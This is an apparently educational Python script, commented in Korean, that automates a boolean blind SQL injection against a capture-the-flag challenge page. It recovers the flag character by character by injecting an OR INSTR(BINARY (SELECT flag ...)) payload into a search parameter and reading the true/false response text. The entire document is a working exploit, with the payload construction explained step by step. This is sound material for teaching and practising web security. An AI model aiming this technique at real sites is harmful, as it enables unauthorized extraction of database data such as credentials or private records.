# Boolean Blind SQL Injection 자동화 예제입니다.
#
# 이 문제는 FLAG를 화면에 바로 출력해주지 않습니다.
# 대신 우리가 만든 SQL 조건이 참이면 "조건에 맞는 공지가 존재합니다." 문구가 뜨고,
# 거짓이면 "조회된 공지가 없습니다." 문구가 뜹니다.
# 그래서 FLAG 후보를 한 글자씩 늘려가며 "이 문자열이 실제 FLAG 안에 들어 있나?"를 확인합니다.

from urllib.parse import urlencode
from urllib.request import urlopen

# 공격 대상 문제 URL입니다.
# IP 주소는 현재 환경에 맞게 변경합니다.
url = "http://100.83.178.9/challenges/blind-notice.php"

# FLAG에 들어갈 수 있는 문자를 하나씩 대입해볼 목록입니다.
# '}'를 맨 앞에 둔 이유는 FLAG 끝을 빨리 감지하기 위해서입니다.
chars = "}_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

# 문제의 FLAG 형식은 FLAG{...} 이므로 이미 알고 있는 접두어부터 시작합니다.
flag = "FLAG{"

# flag가 }로 끝나면 완성된 것으로 보고 반복을 멈춥니다.
while not flag.endswith("}"):
    # 이번 위치에서 맞는 글자를 찾았는지 기록하는 변수입니다.
    found = False

    # chars에 있는 문자를 하나씩 붙여보며 실제 FLAG와 일치하는지 검사합니다.
    for ch in chars:
        # 예: 현재 flag가 FLAG{N2 라면, 다음 후보는 FLAG{N28 같은 식으로 만들어집니다.
        test = flag + ch

        # 원래 서버 쿼리는 대략 title LIKE '%입력값%' 형태입니다.
        # 아래 payload는 따옴표를 닫고 OR 조건을 추가해 SQL 조건을 직접 넣습니다.
        #
        # __nohit__%'
        #   - 정상 검색 조건을 일부러 실패시키기 위한 문자열입니다.
        #   - 이걸 넣지 않으면 LIKE '%%' 꼴이 되어 모든 요청이 참처럼 보일 수 있습니다.
        #
        # INSTR(..., '후보문자열') > 0
        #   - 실제 FLAG 안에 후보 문자열이 포함되어 있으면 참이 됩니다.
        #
        # BINARY
        #   - MySQL/MariaDB는 설정에 따라 대소문자를 같은 문자로 볼 수 있습니다.
        #   - FLAG는 대소문자가 중요하므로 BINARY로 정확히 비교합니다.
        #
        # --
        #   - 뒤에 붙는 SQL 조각을 주석 처리합니다.
        payload = "__nohit__%' OR INSTR(BINARY (SELECT flag FROM challenge_flags WHERE challenge_id='blind-notice'), BINARY '" + test + "') > 0 -- "

        # q 파라미터에 payload를 넣어 GET 요청 URL을 만듭니다.
        # urlencode를 쓰면 공백, 따옴표 같은 특수문자를 URL에 맞게 자동 인코딩해줍니다.
        full_url = url + "?" + urlencode({"q": payload})

        # 실제 HTTP 요청을 보냅니다.
        # 응답 HTML 안에 참/거짓을 구분할 수 있는 문구가 들어 있습니다.
        with urlopen(full_url, timeout=5) as res:
            html = res.read().decode("utf-8", errors="replace")

        # 조건이 참이면 사이트에 이 문구가 표시됩니다.
        # 즉, 지금 만든 test 문자열이 실제 FLAG의 앞부분과 일치한다는 뜻입니다.
        if "조건에 맞는 공지가 존재합니다." in html:
            flag += ch
            print(flag)
            found = True
            break

    # 모든 문자를 시도했는데도 맞는 글자를 못 찾으면 문자셋이 부족하거나 쿼리가 틀린 것입니다.
    if not found:
        print("더 이상 맞는 글자를 찾지 못했습니다.")
        break